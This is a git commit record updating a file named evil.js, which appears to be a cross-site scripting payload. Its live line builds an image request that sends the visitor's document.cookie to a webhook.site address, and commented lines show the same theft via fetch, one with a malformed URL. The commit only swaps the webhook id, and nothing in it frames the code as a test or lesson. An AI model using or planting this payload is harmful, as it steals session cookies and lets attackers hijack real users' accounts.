a2b7acbbc5289e8235907acd82e645d547d22f47
edy230 <63070228+edy230@users.noreply.github.com>
2023-09-24 08:29:23 +0200

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,3 +1,3 @@
-// fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie=" + document.cookie);
+// fetch("https:/https://webhook.site/1b7c9985-8359-4a0f-83b5-b8a1ef07401b/?cookie=" + document.cookie);
 
 var i=new Image;i.src="https://webhook.site/1b7c9985-8359-4a0f-83b5-b8a1ef07401b/?cookie="+document.cookie;
